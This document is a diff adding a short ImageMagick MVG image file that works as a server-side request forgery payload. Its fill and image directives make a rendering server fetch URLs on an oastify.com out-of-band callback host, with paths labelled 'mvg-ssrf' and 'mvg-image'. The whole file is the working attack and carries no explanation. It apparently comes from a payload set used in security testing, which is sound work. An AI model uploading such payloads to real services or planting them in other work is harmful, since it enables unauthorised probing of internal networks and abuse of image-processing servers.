@@ -1,0 +1,5 @@
+push graphic-context
+viewbox 0 0 200 200
+fill 'url(http://l7twf48a8zf4u5zxmferu4h3ruxnl56benetmvwk.oastify.com/mvg-ssrf)'
+image over 0,0 200,200 'http://l7twf48a8zf4u5zxmferu4h3ruxnl56benetmvwk.oastify.com/mvg-image'
+pop graphic-context
